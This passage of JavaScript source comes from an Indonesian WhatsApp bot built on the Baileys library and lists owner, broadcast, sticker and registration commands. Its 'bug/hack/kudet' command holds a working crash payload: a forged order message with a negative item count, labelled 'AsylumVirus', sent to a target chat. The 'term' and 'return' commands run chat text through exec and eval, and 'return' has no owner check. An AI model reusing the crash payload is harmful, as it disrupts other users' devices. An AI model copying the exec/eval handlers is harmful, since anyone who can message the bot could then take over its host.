						lisv += `◯ ${awokwkwk}\n`
					}
					lisv += `\n╰─────「 *${audioya.length}* 」`
					dila.sendMessage(from, lisv.trim(), extendedText, { quoted: Lan, contextInfo: { "mentionedJid": audioya } })
					break

				case 'addimage':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					if (!isQuotedImage) return reply('Reply Gambar Nya Kak')
					sepimg = body.slice(10)
					if (!sepimg) return reply('Nama Gambar Nya Apa?')
					svimeg = JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					imej = await dila.downloadMediaMessage(svimeg)
					imegya.push(`${sepimg}`)
					fs.writeFileSync(`./media/image/${sepimg}.jpeg`, imej)
					fs.writeFileSync('./media/image.json', JSON.stringify(imegya))
					dila.sendMessage(from, `Gambar Berhasil Ditambahkan Ke Database Bot`, MessageType.text, { quoted: Lan })
					break

				case 'getimage':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Nama Gambar Nya Apa kak?\nKalo Gak Tau Ketik :\n${prefix}listimage`)
					namastc = body.slice(10)
					buffer = fs.readFileSync(`./media/image/${namastc}.jpeg`)
					dila.sendMessage(from, buffer, image, { quoted: Lan })
					break

				case 'listimage':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					lisi = '╭──「 *LIST IMAGE* 」\n'
					for (let menghilih of imegya) {
						lisi += `◯ ${menghilih}\n`
					}
					lisi += `\n╰─────「 *${imegya.length}* 」`
					dila.sendMessage(from, lisi.trim(), extendedText, { quoted: Lan, contextInfo: { "mentionedJid": imegya } })
					break
				
				case 'ownermenu':
					const bosnya = `\`\`\`┌─❏「 ${pushname} 」\`\`\`
\`\`\`│◪ ${prefix}addprem\`\`\`
\`\`\`│◪ ${prefix}dellprem\`\`\`
\`\`\`│◪ ${prefix}addrespon\`\`\`
\`\`\`│◪ ${prefix}delrespon\`\`\`
\`\`\`│◪ ${prefix}ban\`\`\`
\`\`\`│◪ ${prefix}colong\`\`\`
\`\`\`│◪ ${prefix}unban\`\`\`
\`\`\`│◪ ${prefix}addbadword\`\`\`
\`\`\`│◪ ${prefix}delbadword\`\`\`
\`\`\`│◪ ${prefix}badwordlist\`\`\`
\`\`\`│◪ ${prefix}bc\`\`\`
\`\`\`│◪ ${prefix}bug\`\`\`
\`\`\`│◪ ${prefix}self\`\`\`
\`\`\`│◪ ${prefix}public\`\`\`
\`\`\`│◪ ${prefix}leave\`\`\`
\`\`\`│◪ ${prefix}delchatgc\`\`\`
\`\`\`│◪ ${prefix}delttc\`\`\`
\`\`\`│◪ ${prefix}upswteks\`\`\`
\`\`\`│◪ ${prefix}upswimage\`\`\`
\`\`\`│◪ ${prefix}upswvideo\`\`\`
\`\`\`│◪ ${prefix}shutdown\`\`\`
\`\`\`│◪ ${prefix}setreply\`\`\`
\`\`\`│◪ ${prefix}setprefix\`\`\`
\`\`\`│◪ ${prefix}setbio\`\`\`
\`\`\`│◪ ${prefix}setppbot\`\`\`
\`\`\`│◪ ${prefix}setnamebot\`\`\`
\`\`\`│◪ ${prefix}setthumb\`\`\`
\`\`\`│◪ ${prefix}clearall\`\`\`
\`\`\`│◪ ${prefix}resetlimit\`\`\`
\`\`\`│◪ ${prefix}event\`\`\`
\`\`\`│◪ ${prefix}term\`\`\`
\`\`\`│◪ ${prefix}return\`\`\`
\`\`\`│◪ ${prefix}readall\`\`\`
\`\`\`└─❏「 ${pushname} 」\`\`\``
					dila.sendMessage(from, bosnya, text, { thumbnail: dnsnew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./src/image/thumbnail.jpeg'), surface: 200, message: 'Owner Menu', orderTitle: 'Owner Menu', sellerJid: '0@s.whatsapp.net'}}}})
					break			
					
					case 'colong':
					if (!isOwner) return reply(dla.ownerb())
		if (!isQuotedSticker) return reply('Reply stickernya')
		const encmediia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	        const meidia = await dila.downloadAndSaveMediaMessage(encmediia, `./temp/${sender}`)
		    exec(`webpmux -set exif ./temp/data.exif ./temp/${sender}.webp -o ./temp/${sender}.webp`, async (error) => {
		    if (error) return reply('error')
		    dila.sendMessage(from, fs.readFileSync(`./temp/${sender}.webp`), MessageType.sticker, {quoted: Lan})
					fs.unlinkSync(media)
					fs.unlinkSync(`./temp/takestick_${sender}.exif`)
				})
				break
					case 'setnamebot':
					if (!isOwner) return reply(dla.ownerb())
				if (args.length < 1) return reply('Teksnya?')
                anu = body.slice(12)
                dila.updateProfileName(anu)
                reply(`Sukses mengganti nama ke:\n${anu}`)
                break
					case 'addrespon':
				if (!isOwner) return reply(dla.ownerb())
				if (args.length < 1) return reply(`Penggunaan ${prefix}addrespon hai|hai juga`)
				argzo = arg.split('|')
				if (checkCommands(argzo[0], commandsDB) === true) return reply(`Udah ada`)
				addCommands(argzo[0], argzo[1], sender, commandsDB)
				reply('Ok berhasil gan')
				break
			case 'delrespon':
			    if (!isOwner) return reply(dla.ownerb())
				if (args.length < 1) return reply(`Penggunaan ${prefix}delrespon hai`)
				if (!checkCommands(body.slice(6), commandsDB)) return reply(`Ga ada di database`)
                deleteCommands(body.slice(6), commandsDB)
				reply('Ok berhasil gan')
				break
					case 'bug':
            case 'hack':
            case 'kudet':
            if (!isOwner) return reply(dla.ownerb())
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
dila.sendMessage(nomor, `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
    orderMessage: {
    thumbnail: dnsnew,
    itemCount: -969769349, // Bug
    status: 1,
    surface: 1,
    message: '☠️Asylum☠️',
    orderTitle: 'AsylumVirus', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
dila.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}
async function attack(targett){
bug(targett)
await sleep(3000)
troli(targett)
await sleep(3000)
bug(targett)
}

attack(Lan.key.remoteJid)
break
					case 'self':
           if (!isOwner) return reply(dla.ownerb())
           if (self === true) return 
            let denzz = {
            thumbnail: dnsnew, sendEphemeral: true,
            quoted: { 
           key: { 
           fromMe: false, participant: `0@s.whatsapp.net`, 
           remoteJid: "6283136505591-1614953337@g.us", id: "B391837A58338BA8186C47E51FFDFD4A" }, 
           message: { documentMessage: { 'jpegThumbnail': fs.readFileSync("./src/image/thumbnail.jpeg"), mimetype: "application/octet-stream",
           title: "Status : Self", fileLength: "36", pageCount: 0, 
           fileName: "Status : Self",
           messageTimestamp: "1614069378", status: "PENDING"
           }
           }
           }
           }
           self = true 
           let lat =`\`\`\`Sukses Mengaktifkan Mode Self\`\`\``
           dila.sendMessage(from, lat, MessageType.text, denzz)
           break  
           case 'public':
           if (!isOwner) return reply(dla.ownerb())
           if (self === false) return 
           let denss = {
           thumbnail: dnsnew, sendEphemeral: true,
           quoted: { 
           key: { 
           fromMe: false, participant: `0@s.whatsapp.net`, 
           remoteJid: "6283136505591-1614953337@g.us", id: "B391837A58338BA8186C47E51FFDFD4A" }, 
           message: { documentMessage: { 'jpegThumbnail': fs.readFileSync("./src/image/thumbnail.jpeg"), mimetype: "application/octet-stream",
           title: "Status : Public", fileLength: "36", pageCount: 0, 
           fileName: "Status : Public",
           messageTimestamp: "1614069378", status: "PENDING"
           }
           }
           }
           }
           self = false
           let breh =`\`\`\`Sukses Mengaktifkan Mode Public\`\`\``
           dila.sendMessage(from, breh, MessageType.text, denss)
           break
					case 'delchatgc':
					if (!isOwner) return reply(dla.ownerb())
                reply('Sukses membersihkan pesan')
                console.log('succes delete chat = ' + from)
                await sleep(5000)
                dila.modifyChat(from, ChatModification.delete)
                break
case 'upswteks':
if (!isOwner) return reply(dla.ownerb())
                    teks = body.slice(10)
                    dila.sendMessage('status@broadcast', teks, MessageType.text)
                    reply(`Sukses upload status:\n${teks}`)
                    break	
case 'upswvideo':
if (!isOwner) return reply(dla.ownerb())
                    var konti = body.slice(11)
                    reply('Otw...')
                    enmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(enmedia)
                    const buffer3 = fs.readFileSync(media)
                    dila.sendMessage('status@broadcast', buffer3, MessageType.video, {quoted: Lan, caption: `${konti}`})
                    reply(`Sukses upload video:\n${konti}`)
                        break
                        case 'upswimage':
                        if (!isOwner) return reply(dla.ownerb())
                    var teksyy = body.slice(11)
                    reply('Otw...')
                    enmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    dila.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: Lan, caption: `${teksyy}`})
                    reply(`Sukses upload image:\n${teksyy}`)
                        break
					case 'shutdown':
					if (!isOwner) return reply(dla.ownerb())
				reply('Okey')
				console.log(color('[SYSTEM]', 'cyan'), color('Bye kak besok ketemu lagi ya, Jangan lupa sholat kak', 'yellow'), color('(😊)', 'white'))
				await sleep(5000)
				dila.close()
				break
				case 'leave':
				if (!isOwner) return reply(dla.ownerb())
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					setTimeout(() => {
						dila.groupLeave(from)
					}, 2000)
					setTimeout(() => {
						dila.updatePresence(from, Presence.composing)
						if (!isRegistered) return reply(dla.noregis())
						if (isBanned) return reply(dla.baned())
						fakestatus('Aku pamit kak:)')
					}, 0)
					break
                case 'setthumb':
                if (!isOwner) return reply(dla.ownerb())
                    if (!isQuotedImage) return reply('Reply imagenya blokk!')
                    const messimagethumb = JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                    const downiamgethumb = await dila.downloadMediaMessage(messimagethumb)
                    fs.unlinkSync(`./src/image/thumbnail.jpeg`)
                    await sleep(2000)
                    fs.writeFileSync(`./src/image/thumbnail.jpeg`, downiamgethumb)
                    dila.sendMessage(from, `\`\`\`Succes\`\`\``, text, { thumbnail: dnsnew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./src/image/thumbnail.jpeg'), surface: 200, message: cr, orderTitle: cr, sellerJid: '0@s.whatsapp.net'}}}})
                    break
				case 'setppbot':
				dila.updatePresence(from, Presence.composing)
				if (!isQuotedImage) return reply(`Kirim gambar dengan caption ${prefix}setbotpp atau tag gambar yang sudah dikirim`)
					if (!isOwner) return reply(dla.ownerb())
					enmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(enmedia)
					await dila.updateProfilePicture(botNumber, media)
					dila.sendMessage(from, `\`\`\`Succes\`\`\``, text, { thumbnail: dnsnew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: await getBuffer(me.imgUrl), surface: 200, message: cr, orderTitle: cr, sellerJid: '0@s.whatsapp.net'}}}})
					break
                 case 'readall':
					if (!isOwner) return reply(dla.ownerb())
					var chats = await dila.chats.all()
                    chats.map( async ({ jid }) => {
                          await dila.chatRead(jid)
                    })
					rdl = `Berhasil membaca ${chats.length} Chat !`
					await dila.sendMessage(from, rdl, MessageType.text, {quoted: Lan})
					console.log(chats.length)
					break
				case 'addprem':
					if (!isOwner) return reply(dla.ownerb())
					adprem = `${args[0].replace('@', '')}@s.whatsapp.net`
					premium.push(adprem)
					fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
					fakestatus(`BERHASIL MENAMBAHKAN USER PREMIUM`)
					break

				case 'dellprem':
					if (!isOwner) return reply(dla.ownerb())
					delprem = `${args[0].replace('@', '')}@s.whatsapp.net`
					delp = ban.indexOf(delprem)
					premium.splice(delp, 1)
					fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
					fakestatus(`BERHASIL MENGHAPUS USER PREMIUM`)
					break
					
                case 'premiumlist':
				dila.updatePresence(from, Presence.composing) 
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
				pemlist = '╭──「 *USER PREMIUM* 」\n'
				for (let premm of premium) {
					pemlist += `> @${premm.split('@')[0]}\n`
					}
					pemlist += `Total : ${premium.length}`
				dila.sendMessage(from, pemlist.trim(), extendedText, {quoted: Lan, contextInfo: {"mentionedJid": premium}})
				break
				
				case 'ban':
					if (!isOwner) return reply(dla.ownerb())
					if (args[0].startsWith('6285866295942')) return reply('\`\`\`Error!\`\`\`')
					if (args[0].startsWith('6285876210829')) return reply('\`\`\`Error!\`\`\`')
					bnnd = `${args[0].replace('@', '')}@s.whatsapp.net`
					ban.push(bnnd)
					fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
					fakestatus(`Nomor ${bnnd} telah dibanned!`)
					break

				case 'unban':
					if (!isOwner) return reply(dla.ownerb())
					ya = `${args[0].replace('@', '')}@s.whatsapp.net`
					unb = ban.indexOf(ya)
					ban.splice(unb, 1)
					fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
					fakestatus(`Nomor ${ya} telah di unban!`)
					break
                   case 'addbadword':
					if (!isOwner) return reply(dla.ownerb())
                    if (args.length < 1) return reply( `Kirim perintah ${prefix}addbadword [kata kasar]. contoh ${prefix}addbadword bego`)
                    const bw = body.slice(12)
                    bad.push(bw)
                    fs.writeFileSync('./database/bad.json', JSON.stringify(bad))
                    reply('Success Menambahkan Bad Word!')
                    break
                case 'delbadword':
					if (!isOwner) return reply(dla.ownerb())
                    if (args.length < 1) return reply( `Kirim perintah ${prefix}addbadword [kata kasar]. contoh ${prefix}addbadword bego`)
                    let dbw = body.slice(12)
                    bad.splice(dbw)
                    fs.writeFileSync('./database/bad.json', JSON.stringify(bad))
                    reply('Success Menghapus BAD WORD!')
                    break 
                case 'listbadword':
                case 'badwordlist':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
                    let lbw = `Ini adalah list BAD WORD\nTotal : ${bad.length}\n`
                    for (let i of bad) {
                        lbw += `➢ ${i.replace(bad)}\n`
                    }
                    await reply(lbw)
                    break
				case 'bc':
					dila.updatePresence(from, Presence.composing)
					if (!isOwner) return reply(dla.ownerb())
					if (args.length < 1) return reply('Teksnya?')
					anu = await dila.chats.all()
					if (isMedia && !Lan.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
						buff = await dila.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							dila.sendMessage(_.jid, buff, image, { caption: `${body.slice(4)}` })
						}
						reply('')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `${body.slice(4)}`)
						}
						reply(`Sukses mengirim broadcast:\n${body.slice(4)}`)
					}
					break
					case 'bcaud':
					dila.updatePresence(from, Presence.composing)
					if (!isOwner) return reply(dla.ownerb())
					anu = await dila.chats.all()
					if (isMedia && !Lan.message.audioMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
						buff = await dila.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							dila.sendMessage(_.jid, buff, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true })
						}
						reply('')
						} else {
						for (let _ of anu) {
							sendMess(_.jid, `${body.slice(4)}`)
						}
						reply(`Sukses mengirim broadcast:\n${body.slice(4)}`)
					}
					break
				case 'setreply':
					if (!isOwner) return reply(dla.ownerb())
					dila.updatePresence(from, Presence.composing)
					if (args.length < 1) return
					cr = body.slice(10)
					fakestatus(`reply berhasil di ubah menjadi : ${cr}`)
					await limitAdd(sender)
					break					
					
				case 'setprefix':
					if (args.length < 1) return
					if (!isOwner) return reply(dla.ownerb())
					prefix = args[0]
					fakestatus(`*「 SUKSES 」* Prefix jadi ❏ : ${prefix}`)
					break

				case 'setbio':
					if (!isOwner) return reply(dla.ownerb())
					iyek = body.slice(8)
					dila.setStatus(`${iyek}`)
					fakestatus(`Status BOT berhasil diperbarui menjadi :\n*[ ${iyek} ]*`)
					break
					
				case 'clearall':
					if (!isOwner) return reply(dla.ownerb())
					anu = await dila.chats.all()
					dila.setMaxListeners(25)
					for (let _ of anu) {
						dila.deleteChat(_.jid)
					}
					fakestatus(dla.clears())
					break

				case 'resetlimit':
					if (!isOwner) return reply(dla.ownerb())
					var ngonsol = []
					rest = _limit.indexOf([])
					_limit.splice(rest)
					fs.writeFileSync('./database/limit.json', JSON.stringify(ngonsol))
					fakestatus(`LIMIT BERHASIL DI RESET BOS`)
					break

				case 'event':
					if (isBanned) return reply(dla.baned())
					if (!isGroup) return reply(dla.groupo())
					if (!isOwner) return reply(dla.ownerb())
					if (args.length < 1) return reply('Ekhemm >_<')
					if (Number(args[0]) === 1) {
						if (isEventon) return reply('*FITUR EVENT SUDAH AKTIF BOS*')
						event.push(from)
						fs.writeFileSync('./database/event.json', JSON.stringify(event))
						reply('*「 SUKSES 」MENGAKTIFKAN EVENT DI GROUP*')
					} else if (Number(args[0]) === 0) {
						event.splice(from, 1)
						fs.writeFileSync('./database/event.json', JSON.stringify(event))
						reply('*「 SUKSES 」MEMATIKAN EVENT DI GROUP*')
					} else {
						reply('pilih 1/0')
					}
					break

				case 'term':
					if (!isOwner) return reply(dla.ownerB())
					const cmd = body.slice(6)
					var itsme = `0@s.whatsapp.net`
					var split = `EXECUTOR`
					const term = {
						contextInfo: {
							participant: itsme,
							quotedMessage: {
								extendedTextMessage: {
									text: split,
								}
							}
						}
					}
					exec(cmd, (err, stdout) => {
						if (err) return dila.sendMessage(from, `root@Denz:~ ${err}`, text, { quoted: Lan })
						if (stdout) {
							dila.sendMessage(from, stdout, text, term)
						}
					})
					break

				case 'return':
					return dila.sendMessage(from, JSON.stringify(eval(args.join(''))), text, { quoted: Lan })
					break
				default:
				if (isMedia && isAuto && !Lan.message.videoMessage || isQuotedImage) {
						const encmedia = Lan
						const media = await dila.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(dla.stikga())
							})
							.on('end', function () {
								console.log('Finish')
								buffer = fs.readFileSync(ran)
								dila.sendMessage(from, buffer, sticker, { quoted: Lan})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
	           // FOR VIDEO OR G
		   if ((isMedia & isAuto && !Lan.message.imageMessage || isQuotedVideo)) {
						const encmedia = Lan
						const media = await dila.downloadAndSaveMediaMessage(encmedia)
						if (Buffer.byteLength(media) >= 6186598.4) return reply(`sizenya terlalu gede sayang, dd gakuat :(`)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(`Gagal, video nya kebesaran, dd gakuat`)
							})
							.on('end', function () {
								console.log('Finish')
								buff = fs.readFileSync(ran)
								dila.sendMessage(from, buff, sticker, { quoted: Lan})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
						}
						}
				if (budy == '@verify') {
						if (isBanned) return reply(dla.baned())
						if (isRegistered) return reply(dla.rediregis())
						const serialUser = createSerial(20)
						veri = sender
						if (isGroup) {
							addRegisteredUser(sender, pushname, time, serialUser)
							try {
								ppadd = await dila.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
							} catch {
								ppadd = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
							}
							captnya = `\`\`\`┌「 TERVERIFIKASI 」\`\`\`
\`\`\`│\`\`\`
\`\`\`│❏ Nama : ${pushname}\`\`\`
\`\`\`│❏ Nomor : wa.me/${sender.split("@")[0]}\`\`\`
\`\`\`│❏ Waktu : ${time}\`\`\`
\`\`\`│❏ SN : ${serialUser}\`\`\`
\`\`\`│❏ User Verified : ${_registered.length}\`\`\`
\`\`\`│\`\`\`
\`\`\`└「 ${botName} 」\`\`\``
							let peripi = await getBuffer(ppadd)
							dila.sendMessage(from, peripi, image, {
								caption: captnya, quoted: {
									key: {
										fromMe: false,
										participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
									},
									message: {
										conversation: cr
									}
								}
							})
							addATM(sender)
							addLevelingId(sender)
							console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(pushname, 'cyan'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
							console.log(color('[SYSTEM]', 'cyan'), color('Wih ada user baru kak', 'yellow'), color('(😯)', 'white'))
						} else {
							addRegisteredUser(sender, pushname, time, serialUser)
							try {
								ppadd = await dila.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
							} catch {
								ppadd = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
							}
							captnya = `\`\`\`┌「 TERVERIFIKASI 」\`\`\`
\`\`\`│\`\`\`
\`\`\`│❏ Nama : ${pushname}\`\`\`
\`\`\`│❏ Nomor : wa.me/${sender.split("@")[0]}\`\`\`
\`\`\`│❏ Waktu : ${time}\`\`\`
\`\`\`│❏ SN : ${serialUser}\`\`\`
\`\`\`│❏ User Verified : ${_registered.length}\`\`\`
\`\`\`│\`\`\`
\`\`\`└「 ${botName} 」\`\`\``
							let peripi = await getBuffer(ppadd)
							dila.sendMessage(from, peripi, image, {
								caption: captnya, quoted: {
									key: {
										fromMe: false,
										participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
									},
									message: {
										conversation: cr
									}
								}
							})
						}
						addATM(sender)
						addLevelingId(sender)
						console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(pushname, 'cyan'), 'Serial:', color(serialUser, 'cyan'))
						}
			}
			if (budy == 'cekprefix') {
				fakestatus(`\`\`\`${botName} MENGGUNAKAN PREFIX :「 ${prefix} 」\`\`\``)
			}
			if (budy == 'status') {
				fakestatus(`\`\`\`Status : ${self ? 'Self' : 'Public'}\`\`\``)
			}
			if (budy.includes(`${owner}`)){
			console.log(color('[SYSTEM]', 'cyan'), color('Ada yang ngetag kakak tuh kak', 'yellow'), color('(😡)', 'white'))
            reply(`Maaf ${pushname} , Owner ${botName} tidak menerima Tag!`)
            }
            if (budy == 'bot') {
            	daud = fs.readFileSync('./dns/bot.mp3')
				dila.sendMessage(from, daud, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./dns/dnsnew.jpg'), surface: 200, message: cr, orderTitle: cr, sellerJid: '0@s.whatsapp.net'}}}})
           }
            if (hour_now >= '02:00' && hour_now <= '04:00') {
          console.log(color('[SYSTEM]', 'cyan'), color('Waktunya sahur kak, Main botnya buat nanti lagi, Sebelum makan jangan lupa baca Doa ya kak', 'yellow'), color('(😊)', 'white'))
          }
        if (hour_now >= '04:00' && hour_now <= '05:00') {
          console.log(color('[SYSTEM]', 'cyan'), color('Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak', 'yellow'), color('(😊)', 'white'))
          }
          if (hour_now >= '05:00' && hour_now <= '06:00') {
          console.log(color('[SYSTEM]', 'cyan'), color('Udah sholat Subuh belum kak', 'yellow'), color('(🙄)', 'white'))
          }
        if (hour_now >= '06:00' && hour_now <= '11:00') {
          console.log(color('[SYSTEM]', 'cyan'), color('Pagi kak, Jangan lupa mandi', 'yellow'), color('(😅)', 'white'))
          }
          if (hour_now >= '11:00' && hour_now <= '12:00') {
          console.log(color('[SYSTEM]', 'cyan'), color('Siang kak, Dah mandi blm kak?', 'yellow'), color('(🙄)', 'white'))
          }
          if (hour_now >= '12:00' && hour_now <= '14:00') {
           console.log(color('[SYSTEM]', 'cyan'), color('Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak', 'yellow'), color('(😊)', 'white'))
           }
        if (hour_now >= '14:00' && hour_now <= '15:00') {
          console.log(color('[SYSTEM]', 'cyan'), color('Sore kak, Jangan lupa mandi', 'yellow'), color('(😅)', 'white'))
          }
        if (hour_now >= '15:00' && hour_now <= '16:00') {
          console.log(color('[SYSTEM]', 'cyan'), color('Dah jam 3 kak, Jangan lupa sholat Ashar ya kak', 'yellow'), color('(😊)', 'white'))
          }
        if (hour_now >= '17:00' && hour_now <= '18:00') {
          console.log(color('[SYSTEM]', 'cyan'), color('Bentar lagi buka kak, Sabar ya kak', 'yellow'), color('(😆)', 'white'))
          }
        if (hour_now >= '18:00' && hour_now <= '19:00') {
        	console.log(color('[SYSTEM]', 'cyan'), color('Alhamdulillah, Dah buka kak, Puasanya dibatalin dulu kak, Sebelum makan jangan lupa baca doa kak, Setelah makan langsung sholat Maghrib ya kak', 'yellow'), color('(😊)', 'white'))
        }
        if (hour_now >= '19:00' && hour_now <= '20:00') {
           console.log(color('[SYSTEM]', 'cyan'), color('Bentar lagi jam 8 kak, Yok kak main botnya buat nanti lagi, Sekarang siap-siap dulu buat Sholat Tarawih', 'yellow'), color('(😊)', 'white'))
           }
        if (hour_now >= '20:00' && hour_now <= '00:00') {
           console.log(color('[SYSTEM]', 'cyan'), color('Selamat malam kak, Jangan begadang ya kak, Tar sakit loh', 'yellow'), color('(😄)', 'white'))
        }
          if (hour_now >= '00:00' && hour_now <= '00:01') {
           console.log(color('[SYSTEM]', 'cyan'), color('Dila ngantuk kak, Dila tidur dulu ya kak', 'yellow'), color('(😪)', 'white'))
        }
        if (hour_now >= '00:05' && hour_now <= '02:00') {
           console.log(color('[SYSTEM]', 'cyan'), color('Zzz', 'yellow'), color('(😴)', 'white'))
        }
        dila.on('CB:action,,battery', json => {
		const batteryLevelStr = json[2][0][1].value
		const batterylevel = parseInt(batteryLevelStr)
		console.log('🔋' + batterylevel)
	})
	if (!isGroup && !isCmd && !kuis) {
                        await dila.updatePresence(from, Presence.composing)
                        simi = await fetchJson(`https://api.zeks.xyz/api/simi?apikey=apivinz&text=${budy}`)
                        reply(simi.result)
                    }
            if (isGroup && isSimi && !isCmd && budy != undefined) {
				console.log(budy)
				muehe = await simih(budy)
			    console.log(muehe)
				reply(muehe)
				} else {
				console.log(color('[404]', 'red'), 'Unregistered Command From', color(sender.split('@')[0]))
				}
			} catch (e) {
			console.log('Error : %s', color(e, 'red'))
			}
	})
}
starts()